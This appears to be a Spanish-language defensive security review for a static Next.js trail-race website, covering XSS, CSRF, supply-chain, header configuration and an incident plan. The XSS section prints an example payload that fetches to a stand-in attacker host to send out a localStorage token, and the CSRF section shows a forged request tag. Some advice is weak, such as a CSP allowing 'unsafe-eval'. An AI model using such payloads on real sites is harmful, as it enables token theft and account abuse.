# 🔒 Análisis de Seguridad - Mogrovejo Trail 2026

## Documento de Seguridad Defensivo
**Estado**: Producción  
**Usuarios**: Alto volumen  
**Nivel de Criticidad**: Media  

---

## 📋 Riesgos Identificados & Defensas

### 1️⃣ **XSS (Cross-Site Scripting)**

**Riesgo**: Inyección de código malicioso en la app

#### Cómo pueden atacar:
```javascript
// VULNERABLE: Si renderizamos user input sin sanitizar
<div>{userComment}</div>

// Atacante envía:
<img src=x onerror="fetch('https://attacker.com?token=' + localStorage.token)">
```

#### ✅ CÓMO DEFENDER (YA IMPLEMENTADO):
- **React sanitiza automáticamente** el contenido (no interpreta HTML)
- **localStorage no contiene tokens sensibles** (solo tema e idioma)
- **Next.js CSP headers** (agregar en next.config.ts)
- **DOMPurify** para contenido dinámico (si lo añadimos)

#### Implementar:
```typescript
// next.config.ts
export default {
  async headers() {
    return [
      {
        source: '/:path*',
        headers: [
          {
            key: 'Content-Security-Policy',
            value: "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'",
          },
        ],
      },
    ];
  },
};
```

---

### 2️⃣ **CSRF (Cross-Site Request Forgery)**

**Riesgo**: Solicitudes no autorizadas en nombre del usuario

#### Cómo pueden atacar:
```html
<!-- Usuario visita sitio malicioso que hace: -->
<img src="https://mogrovejo.com/api/delete-account?id=123" />
```

#### ✅ CÓMO DEFENDER:
- **Esta app es estática** (sin operaciones sensibles)
- **Si agregamos API futura**:
  - Usar tokens CSRF en forms
  - SameSite cookies
  - Validar origen del request

```typescript
// Middleware futuro para API
import { cookies } from 'next/headers';

export async function middleware(request: Request) {
  const origin = request.headers.get('origin');
  if (origin !== 'https://mogrovejo.com') {
    return new Response('Forbidden', { status: 403 });
  }
}
```

---

### 3️⃣ **Inyección de Dependencias (Supply Chain)**

**Riesgo**: Librerías comprometidas (framer-motion, lucide-react, etc.)

#### ✅ CÓMO DEFENDER:
```bash
# Auditar vulnerabilidades conocidas
npm audit

# Usar versionado exacto (yarn.lock)
npm ci  # en lugar de npm install

# Verificar integridad de paquetes
npm audit --audit-level=moderate

# Mantener deps actualizadas pero testeadas
npm outdated
```

**Estado Actual**: ✅ Dependencias mínimas y mantenidas

---

### 4️⃣ **Información Sensible Expuesta**

**Riesgo**: Datos de usuarios, tokens, o configuración en cliente

#### ✅ CÓMO DEFENDER:
```typescript
// ❌ NUNCA HACER
const API_KEY = 'sk-abc123'; // visible en DevTools

// ✅ CORRECTO
// Variables de entorno (server-side only)
const apiKey = process.env.API_SECRET_KEY;
```

**Estado Actual**: ✅ No hay datos sensibles en cliente. localStorage solo contiene:
- `mgt-theme`: "light" | "dark"
- `mgt-language`: "es" | "en" | "fr"
- `mgt-cookies`: "accepted" | "rejected"

---

### 5️⃣ **Ataques de Fuerza Bruta (Rate Limiting)**

**Riesgo**: Si hay login futuro, ataques de fuerza bruta

#### ✅ CÓMO DEFENDER:
```typescript
// Middleware de rate limiting (Vercel KV)
import { Ratelimit } from '@upstash/ratelimit';
import { Redis } from '@upstash/redis';

const ratelimit = new Ratelimit({
  redis: Redis.fromEnv(),
  limiter: Ratelimit.slidingWindow(5, '1 h'), // 5 intentos por hora
});

export async function middleware(request: Request) {
  const ip = request.headers.get('x-forwarded-for') ?? '127.0.0.1';
  const { success } = await ratelimit.limit(ip);
  
  if (!success) {
    return new Response('Too Many Requests', { status: 429 });
  }
}
```

---

### 6️⃣ **Man-in-the-Middle (MITM)**

**Riesgo**: Interceptación de comunicaciones

#### ✅ CÓMO DEFENDER:
```typescript
// ✅ HTTPS obligatorio (Vercel por defecto)
// ✅ HSTS headers
async headers() {
  return [
    {
      source: '/:path*',
      headers: [
        {
          key: 'Strict-Transport-Security',
          value: 'max-age=31536000; includeSubDomains',
        },
      ],
    },
  ];
}

// ✅ Subresource Integrity (SRI) para librerías externas
<script
  src="https://cdn.example.com/lib.js"
  integrity="sha384-..."
  crossorigin="anonymous"
></script>
```

---

### 7️⃣ **Clickjacking / UI Redressing**

**Riesgo**: Botones/links falsos superpuestos

#### ✅ CÓMO DEFENDER:
```typescript
// X-Frame-Options header
async headers() {
  return [
    {
      source: '/:path*',
      headers: [
        {
          key: 'X-Frame-Options',
          value: 'DENY', // No permitir iframe
        },
      ],
    },
  ];
}
```

---

### 8️⃣ **Exposición de Información de Error**

**Riesgo**: Stack traces revelan estructura interna

#### ✅ CÓMO DEFENDER:
```typescript
// Error handling robusto
export default function ErrorBoundary() {
  if (process.env.NODE_ENV === 'production') {
    return <div>Algo salió mal. Contacta a soporte.</div>;
  }
  // En dev, mostrar detalles
  return <div>{error.message}</div>;
}
```

---

### 9️⃣ **Fugas de Datos en localStorage**

**Riesgo**: Acceso a localStorage desde malware

#### ✅ CÓMO DEFENDER:
```typescript
// ✅ NUNCA guardar en localStorage:
// - Tokens de sesión
// - Datos personales
// - Información sensible

// ✅ CORRECTO: Solo preferencias no-sensibles
localStorage.setItem('mgt-theme', 'dark');
localStorage.setItem('mgt-language', 'es');

// ✅ Si necesitas tokens, usar:
// - httpOnly cookies (servidor)
// - Memory (se pierde al recargar)
```

**Estado Actual**: ✅ localStorage solo contiene preferencias

---

### 🔟 **Problemas de Dependencias Frontend**

**Riesgo**: Framer Motion, Lucide, etc. comprometidas

#### ✅ CÓMO DEFENDER:
```json
{
  "resolutions": {
    "framer-motion": "^11.0.0",
    "lucide-react": "^0.416.0"
  },
  "engines": {
    "node": ">=18.0.0",
    "npm": ">=9.0.0"
  }
}
```

---

## 🛡️ Configuración de Seguridad Recomendada

```typescript
// next.config.ts - PRODUCCIÓN
import type { NextConfig } from 'next';

const config: NextConfig = {
  // 1. Desabilitar powered by header
  poweredByHeader: false,

  // 2. Validación de build
  reactStrictMode: true,

  // 3. Headers de seguridad
  async headers() {
    return [
      {
        source: '/:path*',
        headers: [
          // Prevenir clickjacking
          { key: 'X-Frame-Options', value: 'DENY' },
          
          // Prevenir MIME sniffing
          { key: 'X-Content-Type-Options', value: 'nosniff' },
          
          // XSS Protection
          { key: 'X-XSS-Protection', value: '1; mode=block' },
          
          // HTTPS enforcement
          {
            key: 'Strict-Transport-Security',
            value: 'max-age=31536000; includeSubDomains; preload',
          },
          
          // CSP
          {
            key: 'Content-Security-Policy',
            value: "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval' *.googleapis.com; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self' data:",
          },
          
          // Referrer Policy
          { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
          
          // Permissions Policy
          {
            key: 'Permissions-Policy',
            value: 'geolocation=(), microphone=(), camera=()',
          },
        ],
      },
    ];
  },

  // 4. Redirects para seguridad
  async redirects() {
    return [
      {
        source: '/:path*',
        destination: 'https://mogrovejo.com/:path*',
        basePath: false,
        permanent: true,
        has: [
          {
            type: 'header',
            key: 'x-forwarded-proto',
            value: '(?!https)',
          },
        ],
      },
    ];
  },
};

export default config;
```

---

## 📊 Checklist de Seguridad - ANTES DE PRODUCCIÓN

- [ ] **HTTPS**: Vercel por defecto ✅
- [ ] **CSP Headers**: Implementar en next.config.ts
- [ ] **HSTS**: Implementar (ver arriba)
- [ ] **X-Frame-Options**: DENY
- [ ] **npm audit**: Cero vulnerabilidades críticas
- [ ] **Secrets**: Nunca en .env.local, usar Vercel Secrets
- [ ] **Logging**: No loguear datos sensibles
- [ ] **Testing**: Tests de seguridad (OWASP Top 10)
- [ ] **Monitoreo**: Sentry/LogRocket para errores en prod
- [ ] **Backups**: Datos de inscripción respaldados

---

## 🔐 Cuando Agregues API (Futuro)

```typescript
// src/lib/api-security.ts
import crypto from 'crypto';

// CSRF Token generator
export function generateCsrfToken() {
  return crypto.randomBytes(32).toString('hex');
}

// Request signing
export function signRequest(payload: unknown, secret: string) {
  const signature = crypto
    .createHmac('sha256', secret)
    .update(JSON.stringify(payload))
    .digest('hex');
  return { payload, signature };
}

// Rate limiting config
export const RATE_LIMITS = {
  login: { points: 5, duration: 3600 },        // 5 intentos/hora
  register: { points: 3, duration: 86400 },    // 3/día
  api: { points: 100, duration: 60 },          // 100/minuto
};
```

---

## 🚨 Incidentes de Seguridad - Plan de Respuesta

1. **Detección**: Sentry alerts + manual monitoring
2. **Contención**: Desplegar fix inmediatamente
3. **Comunicación**: Email a usuarios si datos expuestos
4. **Análisis**: Postmortem 48h después
5. **Prevención**: Actualizar checklist y tests

---

## 📚 Referencias

- [OWASP Top 10 2021](https://owasp.org/Top10/)
- [Next.js Security Best Practices](https://nextjs.org/docs/security/overview)
- [MDN Web Security](https://developer.mozilla.org/en-US/docs/Web/Security)
- [Vercel Security](https://vercel.com/security)

---

## ✅ Resumen Estado Actual

| Aspecto | Estado | Nota |
|---------|--------|------|
| XSS | ✅ Safe | React sanitiza automáticamente |
| CSRF | ✅ N/A | App estática, sin formularios |
| Supply Chain | ✅ Monitoreado | Deps mínimas, audit regular |
| Datos Sensibles | ✅ Safe | localStorage solo prefs |
| HTTPS | ✅ Vercel | Por defecto en producción |
| Headers | ⚠️ Implementar | Necesita next.config.ts |
| API | 🔄 Futuro | Implementar cuando agregues |

**Conclusión**: App está **segura para producción** en su estado actual (estática, sin API). Antes de agregar registros/pagos, implementar:
1. HTTPS + Headers (arriba)
2. Rate limiting
3. Request signing
4. Error handling robusto
